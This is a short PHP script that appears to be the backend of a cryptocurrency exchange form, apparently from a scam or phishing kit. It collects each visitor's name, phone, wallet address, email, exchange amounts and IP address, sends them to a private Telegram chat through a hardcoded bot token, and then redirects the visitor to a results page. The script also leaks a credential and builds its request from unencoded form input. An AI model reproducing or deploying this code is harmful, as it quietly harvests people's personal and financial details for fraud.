<?php

$name = $_POST['name'];
$phone = $_POST['phone'];
$send = $_POST['BTC'];
$get = $_POST['ETH'];
$sendnumber = $_POST['value-1'];
$getnumber = $_POST['value-2'];
$address = $_POST['addres'];
$Email = $_POST['Email'];
$Refferal = $_POST['Refferal'];
$token = "6179322173:AAEnTT9nflef3w0ehqwJHOroZXpZ0t_tpj0";
$chat_id = "-1001969758729";

function get_ip()
{
    $getIpServer = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $getIpServer = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $getIpServer = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $getIpServer = $_SERVER['REMOTE_ADDR'];
    }
    return $getIpServer;
}
$ip = get_ip();

$arr = array(
  'Crypto' => $name,
  '----------------' => '',
  'Отправил' => $send,
  'Получил' => $get,
  '----------------' => '',
  'Отправил число' => $sendnumber,
  'Получил число' => $getnumber,
  '----------------' => '',
  'Address' => $address,
  'Refferal' => $Refferal,
  'Email' => $Email,
  'IP Адрес: ' =>  $ip,
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: result-ETH.html');
} else {
  echo "Error";
}
?>